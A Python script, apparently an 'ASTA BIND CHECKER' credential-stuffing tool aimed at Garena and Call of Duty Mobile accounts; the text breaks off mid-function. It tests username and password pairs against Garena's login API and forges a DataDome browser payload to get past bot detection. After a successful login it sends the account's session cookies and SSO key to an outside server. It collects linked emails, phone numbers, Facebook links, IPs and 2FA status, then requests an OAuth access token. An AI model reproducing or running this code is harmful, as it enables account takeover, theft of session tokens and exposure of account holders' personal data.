import os
import sys
import re
import time
import json
import uuid
import base64
import hashlib
import random
import logging
import urllib
import platform
import subprocess
import requests
import html
from tqdm import tqdm
from colorama import Fore, Style, init
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode
from Crypto.Cipher import AES
init(autoreset=True)
import itertools
from time import sleep
from colorama import Fore, Style
from licensing.models import *
from licensing.methods import Key, Helpers, Message, Product, Customer, Data, AI
import socket
import atexit
from cfonts import render
import socket
import change_cookie
import os
import sys
import re
import time
import json
import uuid
import base64
import hashlib
import random
import logging
import urllib
import platform
import subprocess
import requests
import html
from tqdm import tqdm
from colorama import Fore, Style, init
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode
from Crypto.Cipher import AES
init(autoreset=True)
import itertools
from time import sleep
from colorama import Fore, Style
from licensing.models import *
from licensing.methods import Key, Helpers, Message, Product, Customer, Data, AI
import socket
import atexit
from cfonts import render
import socket
import change_cookie
def get_cookies():
    cookies = []
    try:
        with open('cookies.txt', 'r') as file:
            for line in file:
                line = line.strip()
                if line:
                    if '=' in line:
                        name, value = line.split('=', 1)
                        name = name.strip()
                        value = value.strip()
                        cookie_dict = {
                            "name": name,
                            "value": value,
                            "attributes": {}
                        }
                        cookies.append(cookie_dict)
        return cookies
    except FileNotFoundError:
        print(Fore.RED + "cookies.txt file not found.")
        return []
import certifi
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


init(autoreset=True)

RED = "\033[31m"
RESET = "\033[0m"
BOLD = "\033[1;37m"  
GREEN = "\033[32m"       
apkrov = "https://auth.garena.com/api/login?"
redrov = "https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/"

# You can remove the background task handling since it was dependent on the loginsupport module

import os
import time
from datetime import datetime, timedelta


# ========== Trial Settings ==========
TRIAL_FILE = "trial_start.txt"
TRIAL_DAYS = 9999
TRIAL_HOURS = 0
TRIAL_MINUTES = 0  # For testing, you can set to 1

# ========== ANSI Colors ==========
BLUE = "\033[94m"
RESET = "\033[0m"

# ========== Trial Logic ==========
if os.path.exists(TRIAL_FILE):
    with open(TRIAL_FILE, "r") as f:
        trial_start = datetime.fromisoformat(f.read().strip())
else:
    trial_start = datetime.now()
    with open(TRIAL_FILE, "w") as f:
        f.write(trial_start.isoformat())

trial_duration = timedelta(days=TRIAL_DAYS, hours=TRIAL_HOURS, minutes=TRIAL_MINUTES)
trial_end = trial_start + trial_duration
now = datetime.now()

if now >= trial_end:
    print(f"{BLUE}Trial expired. Please purchase to continue using the checker.{RESET}")
    os.remove(TRIAL_FILE)
    exit()
else:
    remaining = trial_end - now
    days = remaining.days
    hours, rem = divmod(remaining.seconds, 3600)
    minutes, _ = divmod(rem, 60)

# ========== Banner ==========
print(f"""{BLUE}
╔════════════════════════════════════════════════════════════╗
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠿⠋⠀⠀⠙⠛⢿⣿⣿⣿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⡿⠃⠀⠀⠀⠀⣀⡀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣷⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⢀⣠⣶⣿⠟⠋⠀⠀⢀⣠⣴⠞⠉⠁⠀⠀⠈⢻⣿⣿⣿⣝⡿⣿⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠏⣠⣴⣿⠟⣋⣤⣶⣿⣿⡿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣷⣬⡙⠻⢿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⢃⣼⣿⣿⣿⣿⣿⣿⣟⣋⣁⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣶⣄⡉⠻⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣧⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣛⠉⠙⠛⠳⠶⣤⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣦⣈⠙⢿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡝⢿⣿⣿⣿⣿⣿⣷⣄⠙⠻⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⡟⠉⢉⠉⠉⠻⣿⣿⣿⣿⣿⣿⠻⣶⡀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣎⠻⣿⣿⣿⣿⣿⣿⣷⣄⠈⢿⣿⣦⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠋⣿⣿⣿⣿⣷⠶⠋⠀⠀⢀⡈⢻⣿⣿⣿⣿⣦⠈⠛⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣦⠘⢿⣿⣿⣿⣿⣿⣿⣧⡀⠙⢿⣧⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣷⣾⡿⠛⠉⠁⠀⠀⠀⠀⠀⢀⣷⡀⣿⣿⣿⣿⢿⣷⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣧⡀⢻⣿⣿⣿⣿⣿⣿⣿⣄⠀⢻⣿⣆⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⠁⣿⣿⣿⣿⠀⢻⡆⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣷⠀⠹⣿⣿⣿⣿⣿⣿⣿⣧⡀⠹⣿⣆⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⠏⢠⣿⣿⣿⣿⠀⠈⠃⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠹⣿⣿⣿⣿⣿⣿⣿⣧⠀⠙⢿⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⠃⢠⣿⣿⣿⡏⡞⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⢹⣿⣿⣿⣿⣿⣿⣿⣧⠀⠈⣧⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⠇⣠⣿⣿⣿⠟⠀⠁⠀⠀⠀⣀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⢿⣿⣿⣿⣿⣿⣿⣿⣧⡀⢹⣇
⠀⠀⠀⠀⠀⢀⣤⠖⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⡏⢰⣿⣿⣿⣿⣶⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠛
⠀⠀⠀⠀⢠⡾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⠁⢸⣿⣿⣿⠛⠿⣿⣿⣿⣿⣛⣛⣛⠋⠉⠉⠉⠉⠛⠛⠛⠿⣿⣿⣿⣿⣿⣿⣿⡇⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀
⠀⠀⠀⢰⣿⠃⠀⠀⢀⣠⣤⣤⠴⠶⠂⠀⠀⠀⢹⣿⣿⣿⠀⢸⣿⣿⣿⣷⣄⡀⠉⠙⠻⠿⢿⣿⣿⣿⣶⣦⣄⡀⠀⠀⠀⠀⠉⠻⢿⣿⣿⣿⡇⠀⢸⣿⣿⣿⣿⣷⢹⣿⣿⣇⠀
⠀⠀⢠⣿⡇⠀⢀⣴⣿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⡆⠸⣿⣿⣿⣿⣿⣿⣷⣶⣤⣤⣀⡈⠙⠛⠿⣿⣿⣿⣷⣤⣀⠀⠀⠀⠀⠹⣿⣿⡇⠀⠘⣿⣿⣿⣿⣿⠈⣿⣿⣿⠀
⠀⠀⣾⣿⠀⢰⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⡆⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠉⠻⣿⣿⣿⣷⣄⠀⠀⠀⠈⢿⡇⠀⠀⣿⣿⣿⣿⣿⠀⢹⣿⣿⡇
⠀⠀⣿⣿⠀⢸⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⣦⣀⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⠀⠈⠻⣿⣿⣿⣷⡀⠀⠀⠘⡇⠀⢀⣿⣿⣿⣿⣿⠀⢸⣿⣿⠇
⣀⠀⣿⣿⡆⢸⡟⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⡶⠖⣂⣀⣀⣀⡀⠀⠉⠁⠀⠀⠈⠻⢿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣷⡀⠀⠈⢿⣿⣿⣷⡀⠀⠀⠃⠀⢸⣿⣿⣿⣿⣿⠀⢸⣿⣿⠀
⣿⠀⢻⣿⣇⣸⡇⠀⠀⠀⠀⠀⠀⢀⣴⣟⣡⣴⠿⠟⠛⠉⠉⠙⠛⠲⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣧⠻⣿⣿⣿⡄⠀⠈⢻⣿⣿⣷⠀⠀⠀⠀⣼⣿⣿⣿⣿⡟⠀⢸⣿⡿⠀
⣿⡄⠸⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⣾⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⡇⠸⣿⣿⣿⠀⠀⠈⣿⣿⣿⠀⠀⠀⢰⣿⣿⣿⣿⣿⡇⠀⣿⣿⠇⠀
⢹⣧⠀⢻⣿⣿⣿⡆⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⠀⣿⣿⣿⡆⠀⠀⢹⣿⣿⠃⠀⢀⣿⣿⣿⣿⣿⣿⠁⢰⣿⣿⠀⠀
⠘⣿⡄⠈⣿⣿⣿⣿⡀⠀⠀⠀⠀⢿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣶⣦⣄⠀⠀⠀⠀⣿⣿⣿⡟⠀⢸⣿⣿⠃⠀⠀⢸⣿⣿⠀⠀⣸⣿⣿⣿⣿⣿⠃⢀⣾⣿⡏⠀⠀
⠀⢹⣿⣄⠘⣿⣿⣿⣧⠀⠀⠀⠀⠘⣿⣿⣿⡶⠆⠀⠀⠀⠀⠀⠀⣴⣿⣿⠏⠁⠀⠀⠀⠀⠀⢠⣿⣿⣿⠃⠀⣿⣿⡿⠀⠀⠀⣾⣿⡏⠀⣰⣿⣿⣿⣿⣿⠏⠀⣸⣿⠟⠀⠀⠀
⠀⠀⢿⣿⣦⠸⣿⣿⣿⣆⠀⠀⠀⠀⠘⢿⡏⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⠋⠀⣸⣿⣿⠃⠀⠀⣼⣿⡿⠀⣰⣿⣿⣿⣿⣿⠋⠀⣰⣿⠏⠀⠀⠀⠀
⠀⠀⠈⢻⣿⣷⣿⣿⣿⣿⣦⡀⠀⠀⠀⠈⢻⣄⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣷⣤⣄⣀⣤⣴⣿⣿⠟⠁⠀⣴⣿⡿⠁⠀⠀⣼⣿⡿⠃⣼⣿⣿⣿⣿⡿⠋⠀⣰⣿⠏⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠙⢷⣄⠀⠀⠀⠀⠀⠀⠉⠛⠿⢿⣿⣿⣿⠿⠛⠁⠀⣠⣾⣿⠟⠁⠀⣠⣾⣿⡿⢉⣾⣿⣿⣿⣿⠟⠁⠀⣼⣿⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠛⢿⣿⣿⣿⣿⣿⣷⣄⡀⠀⠀⠀⠈⠳⢦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⣿⠿⠛⠁⠀⣠⣶⣿⣿⢋⣴⣿⣿⣿⣿⡿⠋⠀⣤⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⣿⣶⣤⣀⠀⠀⠀⠀⠉⠙⠛⠲⠶⠶⠶⠶⠾⠿⠛⠛⠉⠀⢀⣤⣶⣿⣿⣿⢟⣵⣿⣿⣿⣿⡿⠋⠀⢀⣼⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⢦⣀⠙⠻⢿⣿⣿⣿⣿⣿⣿⣶⣦⣤⣄⣀⣀⠀⠀⠀⠀⣀⣀⣀⣠⣤⣶⣾⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⡿⠋⠀⠀⣠⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢶⣦⣤⣝⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⣀⡔⠋⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

      
║                   ASTA BIND CHECKER                     ║
║                                                            ║
║      • FAST CHECKING                                       ║
║      • ACCURATE                                             ║
║      • NO NEED VPN [DATA]                                  ║
║      • USE VPN [WIFI]                                      ║
║      • AUTO SEPARATE HIGH LEVEL                            ║
║      • OPEN SRC 150 ENCRYPTED 100                                                    ║
╚════════════════════════════════════════════════════════════╝
Trial time left: {days}d {hours}h {minutes}m
{RESET}""")

# ========== Password Protection ==========
PASSWORD = "1"
user_input = input(f"{BLUE}Enter password to access the checker: {RESET}")

if user_input == PASSWORD:
    print(f"{BLUE}Access granted.{RESET}")
    # Your checker logic goes here
else:
    print(f"{BLUE}Access denied. Incorrect password.{RESET}")
    exit()

# ========== Placeholder for Checker Logic ==========
datenok = str(int(time.time()))

# Color codes for future use
W = "\033[0m"         # Reset
GR = "\033[90m"       # Grey
R = "\033[1;31m"      # Red

# Continue with your checker logic...

def strip_ansi_codes_jarell(text):
    ansi_escape_jarell = re.compile(r'\x1B[@-_][0-?]*[ -/]*[@-~]')
    return ansi_escape_jarell.sub('', text)    
def get_datenow():
    return datenok
def generate_md5_hash(password):
    md5_hash = hashlib.md5()
    md5_hash.update(password.encode('utf-8'))
    return md5_hash.hexdigest()
    
def generate_decryption_key(password_md5, v1, v2):
    intermediate_hash = hashlib.sha256((password_md5 + v1).encode()).hexdigest()
    decryption_key = hashlib.sha256((intermediate_hash + v2).encode()).hexdigest()
    return decryption_key

def encrypt_aes_256_ecb(plaintext, key):
    cipher = AES.new(bytes.fromhex(key), AES.MODE_ECB)
    plaintext_bytes = bytes.fromhex(plaintext)
    padding_length = 16 - len(plaintext_bytes) % 16
    plaintext_bytes += bytes([padding_length]) * padding_length
    chiper_raw = cipher.encrypt(plaintext_bytes)
    return chiper_raw.hex()[:32]  # Return a hex string of the first 32 bytes
def getpass(password, v1, v2):
    password_md5 = generate_md5_hash(password)
    decryption_key = generate_decryption_key(password_md5, v1, v2)
    encrypted_password = encrypt_aes_256_ecb(password_md5, decryption_key)
    return encrypted_password

def generate_fingerprint():
    """Generate consistent browser fingerprint"""
    # Screen properties
    screen_width = random.choice([1920, 1366, 1440, 1536, 1600])
    screen_height = random.choice([1080, 768, 900, 864, 1024])
    color_depth = random.choice([24, 30, 16])
    
    # WebGL fingerprint components
    webgl_vendor = random.choice([
        "Google Inc. (NVIDIA)",
        "Intel Inc.", 
        "AMD", 
        "NVIDIA Corporation"
    ])
    webgl_renderer = random.choice([
        "ANGLE (NVIDIA, NVIDIA GeForce RTX 3080 Direct3D11 vs_5_0 ps_5_0, D3D11)",
        "ANGLE (Intel, Intel(R) UHD Graphics 630 Direct3D11 vs_5_0 ps_5_0, D3D11)",
        "ANGLE (AMD, AMD Radeon RX 6700 XT Direct3D11 vs_5_0 ps_5_0, D3D11)"
    ])
    
    # Audio context fingerprint
    audio_hash = hashlib.md5(str(random.getrandbits(128)).encode()).hexdigest()
    
    # Canvas fingerprint
    canvas_hash = hashlib.md5(str(random.getrandbits(128)).encode()).hexdigest()
    
    return {
        "screen": f"{screen_width}x{screen_height}x{color_depth}",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
        "language": "en-US,en;q=0.9",
        "timezone": "America/New_York",
        "webgl_vendor": webgl_vendor,
        "webgl_renderer": webgl_renderer,
        "audio_hash": audio_hash,
        "canvas_hash": canvas_hash,
        "hardware_concurrency": random.choice([4, 6, 8, 12]),
        "device_memory": random.choice([4, 8, 16]),
        "platform": "Win32"
    }
    
def get_datadome_cookie():
    url = 'https://dd.garena.com/js/'
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://account.garena.com',
        'pragma': 'no-cache',
        'referer': 'https://account.garena.com/',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
    }
    
    payload = {
        'jsData': json.dumps({
            "ttst":76.70000004768372,"ifov":False,"hc":4,"br_oh":824,"br_ow":1536,"ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36","wbd":False,"dp0":True,"tagpu":5.738121195951787,"wdif":False,"wdifrm":False,"npmtm":False,"br_h":738,"br_w":260,"isf":False,"nddc":1,"rs_h":864,"rs_w":1536,"rs_cd":24,"phe":False,"nm":False,"jsf":False,"lg":"en-US","pr":1.25,"ars_h":824,"ars_w":1536,"tz":-480,"str_ss":True,"str_ls":True,"str_idb":True,"str_odb":False,"plgod":False,"plg":5,"plgne":True,"plgre":True,"plgof":False,"plggt":False,"pltod":False,"hcovdr":False,"hcovdr2":False,"plovdr":False,"plovdr2":False,"ftsovdr":False,"ftsovdr2":False,"lb":False,"eva":33,"lo":False,"ts_mtp":0,"ts_tec":False,"ts_tsa":False,"vnd":"Google Inc.","bid":"NA","mmt":"application/pdf,text/pdf","plu":"PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF","hdn":False,"awe":False,"geb":False,"dat":False,"med":"defined","aco":"probably","acots":False,"acmp":"probably","acmpts":True,"acw":"probably","acwts":False,"acma":"maybe","acmats":False,"acaa":"probably","acaats":True,"ac3":"","ac3ts":False,"acf":"probably","acfts":False,"acmp4":"maybe","acmp4ts":False,"acmp3":"probably","acmp3ts":False,"acwm":"maybe","acwmts":False,"ocpt":False,"vco":"","vcots":False,"vch":"probably","vchts":True,"vcw":"probably","vcwts":True,"vc3":"maybe","vc3ts":False,"vcmp":"","vcmpts":False,"vcq":"maybe","vcqts":False,"vc1":"probably","vc1ts":True,"dvm":8,"sqt":False,"so":"landscape-primary","bda":False,"wdw":True,"prm":True,"tzp":True,"cvs":True,"usb":True,"cap":True,"tbf":False,"lgs":True,"tpd":True
        }),
        'eventCounters': '[]',
        'jsType': 'ch',
        'cid': 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae',
        'ddk': 'AE3F04AD3F0D3A462481A337485081',
        'Referer': 'https://account.garena.com/',
        'request': '/',
        'responsePage': 'origin',
        'ddv': '4.35.4'
    }

    data = '&'.join(f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items())

    try:
        response = requests.post(url, headers=headers, data=data)
        response.raise_for_status()
        response_json = response.json()
        
        if response_json['status'] == 200 and 'cookie' in response_json:
            cookie_string = response_json['cookie']
            datadome = cookie_string.split(';')[0].split('=')[1]
            return datadome
        else:
            print(f"DataDome cookie not found in response. Status code: {response_json['status']}")
            print(f"Response content: {response.text[:200]}...")
            return None
    except requests.exceptions.RequestException as e:
        print(f"Error getting DataDome cookie: {e}")
        return None

def check_login(account_username, _id, encryptedpassword, password, selected_header, cookies, dataa, date):
    cookies["datadome"] = dataa
    login_params = {
        'app_id': '100082',
        'account': account_username,
        'password': encryptedpassword,
        'redirect_uri': redrov,
        'format': 'json',
        'id': _id,
    }
    login_url = apkrov + f"{urlencode(login_params)}"
    
    try:
        response = requests.get(login_url, headers=selected_header, cookies=cookies, timeout=60)
        response.raise_for_status()
    except requests.exceptions.ConnectionError:
        print("[ERROR] Connection Error - Server refused the connection")
        return "FAILED"
    except requests.exceptions.ReadTimeout:
        print("[ERROR] Timeout - Server is taking too long to respond")
        return "FAILED"
    except requests.RequestException as e:
        print(f"[ERROR] Login Request Failed: {e}")
        return "FAILED"
    try:
        login_json_response = response.json()
    except json.JSONDecodeError:
        print(f"[ERROR] Login Failed: Invalid JSON response. Server Response: {response.text}")
        return "FAILED"

    if 'error_auth' in login_json_response:
        return "[FAILED] Incorrect Password"
    
    if 'error_params' in login_json_response:
        return "[FAILED] Invalid Parameters"
    
    if 'error' in login_json_response:
        return f"{RED}[FAILED] Incorrect Password"
    
    if not login_json_response.get('success', True):
        return "[FAILED] Login Failed"    
   
    session_key = login_json_response.get('session_key', '')
    take = cookies["datadome"]
    if not session_key:
        return "[FAILED] No session key"
    print(f"{Fore.RED}LOGIN SUCCESSFULL")
    set_cookie = response.headers.get('Set-Cookie', '')
    sso_key = set_cookie.split('=')[1].split(';')[0] if '=' in set_cookie else '' 
    
    
    # Merge cookies
    coke = cookies.copy() # Changed from change_cookie()    
    coke = change_cookie.get_cookies()
    coke["ac_session"] = "7tdtotax7wqldao9chxtp30tn4m3ggkr"
    coke["datadome"] = take
    coke["sso_key"] = sso_key

    cookies = get_cookies()
    print(f"[INFO] datadome cookie used: {cookies['datadome'][:30]}...")
    hider = {
        'Host': 'account.garena.com',
        'Connection': 'keep-alive',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
        'sec-ch-ua-mobile': '?1',
        'User-Agent': selected_header["User-Agent"],
        'Accept': 'application/json, text/plain, */*',
        'Referer': f'https://account.garena.com/?session_key={session_key}',
        'Accept-Language': 'en-US,en;q=0.9',
    }

    init_url = 'https://suneoxjarell.x10.bz/jajak.php'
    params = {f'coke_{k}': v for k, v in coke.items()}
    params.update({f'hider_{k}': v for k, v in hider.items()})

    try:
        init_response = requests.get(init_url, params=params, timeout=120)
        init_response.raise_for_status()
    except requests.RequestException as e:
        return f"[ERROR] Init Request Failed: {e}"

    try:
        init_json_response = json.loads(init_response.text)
    except json.JSONDecodeError:
        return "[ERROR] Failed to parse JSON response from server."

    if 'error' in init_json_response or not init_json_response.get('success', True):
        return f"[ERROR] {init_json_response.get('error', 'Unknown error')}"

    bindings = init_json_response.get('bindings', [])
    is_clean = init_json_response.get('status')  # Get status from response

    account_status = init_json_response.get('status', 'Unknown')
    country = "N/A"
    last_login = "N/A"
    last_login_where = "N/A"
    avatar_url = "N/A"
    fb = "N/A"
    eta = "N/A"
    fbl = "N/A"
    mobile = "N/A"
    facebook = "False"
    shell = "0"
    count = "UNKNOWN"
    ipk = "1.1.1.1"    
    region = "IN.TH"
    email = "N/A"
    ipc = "N/A"
    mb = "mb"
    tae = "GS1.1.1741519354.3.0.1741519361.0.0.0"
    mspid2 = "2990f10cf751cf937dcb2b257767d582"
    email_verified = "False"
    authenticator_enabled = False
    two_step_enabled = False

    for binding in bindings:
        if "Country:" in binding:
            country = binding.split("Country:")[-1].strip()
        elif "LastLogin:" in binding:
            last_login = binding.split("LastLogin:")[-1].strip()       
        elif "LastLoginFrom:" in binding:
            last_login_where = binding.split("LastLoginFrom:")[-1].strip()            
        elif "ckz:" in binding:
            count = binding.split("ckz:")[-1].strip()       
        elif "LastLoginIP:" in binding:
            ipk = binding.split("LastLoginIP:")[-1].strip()                                      
        elif "Las:" in binding:
            ipc = binding.split("Las:")[-1].strip()                                    
        elif "Garena Shells:" in binding:
            shell = binding.split("Garena Shells:")[-1].strip()
        elif "Facebook Account:" in binding:
            fb = binding.split("Facebook Account:")[-1].strip()
            facebook = "True"
        elif "Fb link:" in binding:
            fbl = binding.split("Fb link:")[-1].strip()
        elif "Avatar:" in binding:
            avatar_url = binding.split("Avatar:")[-1].strip()
        elif "Mobile Number:" in binding:
            mobile = binding.split("Mobile Number:")[-1].strip()                  
        elif "tae:" in binding:
            email_verified = "True" if "Yes" in binding else "False"
        elif "eta:" in binding:
            email = binding.split("eta:")[-1].strip()
        elif "Authenticator:" in binding:
            authenticator_enabled = "True" if "Enabled" in binding else "False"
        elif "Two-Step Verification:" in binding:
            two_step_enabled = "True" if "Enabled" in binding else "False"

    print (f"{Fore.GREEN}BIND CHECK SUCCESS")
    cookies["sso_key"] = sso_key            
    head = {
    "Host": "auth.garena.com",
    "Connection": "keep-alive",
    "Content-Length": "107",
    "sec-ch-ua": '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    "Accept": "application/json, text/plain, */*",
    "sec-ch-ua-platform": selected_header["sec-ch-ua-platform"],
    "sec-ch-ua-mobile": "?1",
    "User-Agent": selected_header["User-Agent"],
    "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
    "Origin": "https://auth.garena.com",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "en-US,en;q=0.9"
    }               
    data = {
        "client_id": "100082",
        "response_type": "token",
        "redirect_uri": "https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/",
        "format": "json",
        "id": _id
    }            
    try:     
        grant_url = "https://auth.garena.com/oauth/token/grant"        
        reso = requests.post(grant_url, headers=head, data=data, cookies=cookies)   
        if not reso:
            return "[FAILED] No response from server."       
        try:
            data = reso.json()
        except ValueError:
            return "Failed to parse response as JSON."                    
        if "error" in data:            
            return f"[FAILED] {data['error']}"
        else:
        
            if "access_token" in data:
                print(f"{Fore.CYAN}DNS STABILIZING AUTO EXECUTE!! ")

                newdate = get_datadome_cookie()
                
                token_session = reso.cookies.get('token_session', cookies.get('token_session'))                                               
                access_token = data["access_token"]
                tae = show_level(access_token, selected_header,sso_key,token_session, newdate, cookies)                    
                if "[FAILED]" in tae:
                    return tae + "FAILED LOGIN ACCOUNT MAYBE INVALID "
                
                codm_nickname, codm_level, codm_region, uid = tae.split("|")
   

